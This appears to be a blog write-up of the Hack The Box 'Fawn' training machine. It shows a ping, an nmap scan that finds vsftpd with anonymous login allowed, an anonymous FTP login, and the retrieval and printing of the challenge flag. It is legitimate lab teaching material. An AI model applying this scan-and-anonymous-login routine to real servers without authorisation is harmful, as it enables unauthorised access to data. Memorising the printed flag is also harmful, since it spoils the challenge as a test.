---
layout: single
title: 'Fawn'
excerpt: 'Fawn is a very easy Linux machine which explores the File Transfer Protocol (FTP) and its exploitation when misconfigured to allow anonymous access.'
date: 2026-06-03
classes: wide
header:
  teaser: /assets/images/htb-writeup-fawn/fawn_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.svg
categories:
  - HTB Starting Point
tags:
  - Tier-0-Foundations
os: Linux
difficulty: Very Easy
release: 2021-09-30
ip: 10.129.96.44
---

{% include info-card.html %}

## Task 1

![Task 1](/assets/images/htb-writeup-fawn/Task 1.png)

## Task 2

![Task 2](/assets/images/htb-writeup-fawn/Task 2.png)

## Task 3

![Task 3](/assets/images/htb-writeup-fawn/Task 3.png)

## Task 4

![Task 4](/assets/images/htb-writeup-fawn/Task 4.png)

<pre class="language-"><code class="language-">
❯ ping -c 1 10.129.96.44
PING 10.129.96.44 (10.129.96.44) 56(84) bytes of data.
64 bytes from 10.129.96.44: icmp_seq=1 ttl=63 time=384 ms

--- 10.129.96.44 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 384.137/384.137/384.137/0.000 ms
</code></pre>


## Task 5

![Task 5](/assets/images/htb-writeup-fawn/Task 5.png)

<pre class="language-"><code class="language-">
❯ nmap -sCV -p21 10.129.96.44 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-06-26 14:41 -05
Nmap scan report for 10.129.96.44
Host is up (0.12s latency).

PORT   STATE SERVICE VERSION
<span style="color: #bb66ff;">21/tcp open  ftp     vsftpd 3.0.3>
| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span>
|_-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.15.222
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
<span style="color: #bb66ff;">Service Info: OS: Unix</span>

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 3.67 seconds
</code></pre>


## Task 6

![Task 6](/assets/images/htb-writeup-fawn/Task 6.png)
 
## Task 7

![Task 7](/assets/images/htb-writeup-fawn/Task 7.png)

## Task 8

![Task 8](/assets/images/htb-writeup-fawn/Task 8.png)

<pre class="language-"><code class="language-">
❯ ftp 10.129.96.44
Connected to 10.129.96.44.
220 (vsFTPd 3.0.3)
Name (10.129.96.44:root): Anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
</code></pre>


## Task 9

![Task 9](/assets/images/htb-writeup-fawn/Task 9.png)

## Task 10

![Task 10](/assets/images/htb-writeup-fawn/Task 10.png)

## Task 11

![Task 11](/assets/images/htb-writeup-fawn/Task 11.png)

## Submit Flag

![Submit Flag](/assets/images/htb-writeup-fawn/Task 12.png)

<pre class="language-"><code class="language-">
ftp> ls
229 Entering Extended Passive Mode (|||49340|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
226 Directory send OK.
ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||39003|)
150 Opening BINARY mode data connection for flag.txt (32 bytes).
100% |*************************************************************************************************************************************************************************************************************|    32        0.98 MiB/s    00:00 ETA
226 Transfer complete.
32 bytes received in 00:00 (0.25 KiB/s)
ftp> quit
221 Goodbye.
❯ ls
allPorts  flag.txt  targeted
❯ cat flag.txt
─────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
     │ File: flag.txt
─────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1 │ <span style="color: #bb66ff;">035db21c881520061c53e0536e44f815</span>
─────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
</code></pre>

![You have solved Fawn!](/assets/images/htb-writeup-fawn/You%20have%20solved%20Fawn!.png)